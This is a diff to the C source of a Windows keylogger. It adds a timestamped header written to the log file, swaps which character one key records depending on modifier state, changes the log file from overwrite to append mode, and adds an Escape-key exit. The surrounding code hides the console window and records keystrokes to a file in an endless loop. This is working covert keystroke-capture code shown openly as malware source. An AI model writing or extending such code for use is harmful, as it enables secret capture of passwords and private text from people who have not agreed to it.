@@ -6,6 +6,7 @@
 #include "win_keylog.h"
 
 // Define special keys
+/* https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes */
 int specialKeys[] = {
     VK_BACK, 
     VK_RETURN, 
@@ -49,6 +50,24 @@ int specialKeys[] = {
     0x38,
     0x39,
 };
+
+// Whenever the keylogger is started, add this to the file first
+void WriteHeader(const char* filePath) {
+    FILE *file;
+    file = fopen(filePath, "a");
+    if (file == NULL) {
+        return;
+    }
+
+    // Write the date and time into the file
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    char date[100];
+    sprintf(date, "[%02d/%02d/%04d %02d:%02d:%02d] : ", st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond);
+    fputs(date, file);
+    fflush(file);
+    fclose(file);
+}
 
 // Write the captured key into a file
 void WriteIntoFile(char data, const char* filePath) {
@@ -174,9 +193,9 @@ char* SpecialKeyToReadable(int data) {
             if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_RSHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001) {
                 specialKey = "+";
             } else if (GetKeyState(VK_RMENU) & 0x0001) {
-                specialKey = "}";
-            } else {
                 specialKey = "=";
+            } else {
+                specialKey = "}";
             }
             break;
         case VK_DIVIDE:
@@ -311,12 +330,15 @@ void windows_keylog(const char* filePath) {
 
     // Clear the log file
     FILE *temp;
-    temp = fopen(filePath, "w");
+    temp = fopen(filePath, "a+");
     fclose(temp);
+
+    // Write the header into the file
+    WriteHeader(filePath);
 
     // Hide the console
     HWND hWnd = GetConsoleWindow();
-    ShowWindow( hWnd, SW_HIDE );
+    ShowWindow(hWnd, SW_HIDE);
 
     // Infinite loop
     while(1) {
@@ -349,5 +371,29 @@ void windows_keylog(const char* filePath) {
                 }
             }
         }
+
+        // Check if the keylogger should end
+        end_keylog(filePath);
+    }
+}
+
+// End the keylogger
+void end_keylog(const char* filePath) {
+    // If the escape key is pressed, end the keylogger
+    if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
+        // Add a new line to the file
+        FILE *file;
+        file = fopen(filePath, "a");
+        if (file == NULL) {
+            return;
+        }
+        fputs("\n", file);
+        fflush(file);
+        fclose(file);
+
+        // Show the console
+        HWND hWnd = GetConsoleWindow();
+        ShowWindow(hWnd, SW_SHOW);
+        exit(0);
     }
 }
